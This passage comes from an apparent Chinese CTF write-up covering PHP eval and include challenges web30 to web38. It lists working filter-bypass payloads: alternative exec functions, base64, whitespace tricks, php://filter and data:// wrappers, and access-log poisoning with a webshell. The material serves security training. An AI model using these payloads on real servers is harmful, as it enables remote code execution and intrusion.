</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:42:26
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这里过滤了关键字flag，system还有php，由于过滤了system我们需要使用其他的系统函数进行命令执行</p>
<p>payload:</p>
<blockquote>
<ol>
<li>
<p>c=printf(exec(&ldquo;cat%20fl*&rdquo;));</p>
</li>
<li>
<p>c=echo exec(&ldquo;cat f\lag.p\hp&rdquo;);</p>
</li>
<li>
<p>c=show_source(scandir(&rdquo;.&rdquo;)[2]); (这个函数会返回一个包含当前目录下所有文件和目录项的数组)</p>
</li>
<li>
<p>c=highlight_file(next(array_reverse(scandir(&rdquo;.&rdquo;))));</p>
</li>
<li>
<p>c=passthru(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=echo `tac fla*`;</p>
</li>
<li>
<p>c=$a=sys;$b=tem;$c=$a.$b;$c(&ldquo;tac fla*&rdquo;);*</p>
</li>
<li>
<p>c=echo shell_exec(&ldquo;tac fla*&rdquo;);</p>
</li>
<li>
<p>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</p>
</li>
<li>
<p>c=passthru(base64_decode(&ldquo;Y2F0IGZsYWcucGhw==&rdquo;));(base64绕过)</p>
<p>&hellip;&hellip;</p>
</li>
</ol></blockquote>
<h4 id="web31">web31<a hidden class="anchor" aria-hidden="true" href="#web31">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'</p>
<p>payload:</p>
<blockquote>
<ol>
<li>c=eval($_GET[1]);&amp;1=system(&ldquo;tac flag.php&rdquo;);</li>
<li>c=show_source(scandir(getcwd())[2]);</li>
<li>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</li>
<li>c=passthru(&ldquo;tac%09fla*&rdquo;);</li>
<li>c=echo`tac%09fla*`;</li>
</ol></blockquote>
<h4 id="web32">web32<a hidden class="anchor" aria-hidden="true" href="#web32">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 00:56:31
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题屏蔽了关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(</p>
<p><em>过滤了空格可以用<code>${IFS}</code>和<code>%0a</code> 代替，分号可以用<code>?&gt;</code>代替</em></p>
<p>用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<p>得到的结果用base64解码一下就可以得到flag了</p>
<p>或者用日志注入：</p>
<blockquote>
<p>url/?c=include$_GET[1]?%3E&amp;1=../../../../var/log/nginx/access.log
<code>/var/log/nginx/access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</code></p></blockquote>
<h4 id="web33">web33<a hidden class="anchor" aria-hidden="true" href="#web33">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 02:22:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">//
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽的关键词比上一题多了个双引号 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|&quot;</p>
<p>继续使用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web34">web34<a hidden class="anchor" aria-hidden="true" href="#web34">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:29
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽的关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;</p>
<p>继续使用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web35">web35<a hidden class="anchor" aria-hidden="true" href="#web35">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 04:21:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键词 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=</p>
<p>继续使用include构造payload：（wsm还能秒）</p>
<blockquote>
<p>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web36">web36<a hidden class="anchor" aria-hidden="true" href="#web36">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-04 04:21:16
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(|\:|</span><span class="se">\&#34;</span><span class="s2">|\&lt;|\=|\/|[0-9]/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>屏蔽关键字 /flag|system|php|cat|sort|shell|.| |'|`|echo|;|(|:|&quot;|&lt;|=|/|[0-9]</p>
<p>不是哥们，数字也要屏蔽，那我改一下不就好了</p>
<p>继续使用include构造payload：</p>
<blockquote>
<p>url/?c=include$_GET[m]?&gt;&amp;m=php://filter/convert.base64-encode/resource=flag.php</p>
<p>或者</p>
<p>url/?c=include$_GET[m]?&gt;&amp;m=data://text/plain,<?php%20system("tac%20flag.php")?></p></blockquote>
<h4 id="web37">web37<a hidden class="anchor" aria-hidden="true" href="#web37">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:18:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>不是哥们，怎么还是文件包含</p>
<p>payload：</p>
<blockquote>
<p>?c=data://text/plain,<?php system("tac fla*.php")?></p>
<p>或者</p>
<p>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</p></blockquote>
<h4 id="web38">web38<a hidden class="anchor" aria-hidden="true" href="#web38">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-04 00:12:34
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-04 05:23:36
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">//flag in flag.php
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag|php|file/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    
